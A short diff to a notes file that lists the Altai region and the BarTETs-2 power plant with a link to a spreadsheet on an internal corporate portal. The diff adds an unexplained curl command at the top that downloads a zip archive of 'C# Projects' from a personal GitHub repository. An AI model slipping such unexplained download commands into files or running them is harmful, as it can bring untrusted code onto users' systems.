@@ -1,3 +1,7 @@
+curl -L -o "C# Projects 10.zip" "https://raw.githubusercontent.com/KozloFF1337/gguf/main/C%23%20Projects%2010.zip"
+
+
+
 Алтай
 БарТЭЦ-2 https://portal-sgk.suek.ru/org/it/RTE/Shared%20Documents/%D0%9E%D0%BF%D1%82%D0%B8%D0%BC%D0%B8%D0%B7%D0%B0%D1%82%D0%BE%D1%80%20%D0%92%D0%A1%D0%92%D0%93%D0%9E/%D0%90%D0%BB%D1%82%D0%B0%D0%B9_%D0%92%D0%A1%D0%92%D0%93%D0%9E/%D0%91%D0%B0%D1%80%D0%A2%D0%AD%D0%A6-2_%D0%92%D0%A1%D0%92%D0%93%D0%9E.xlsm?Web=1
 
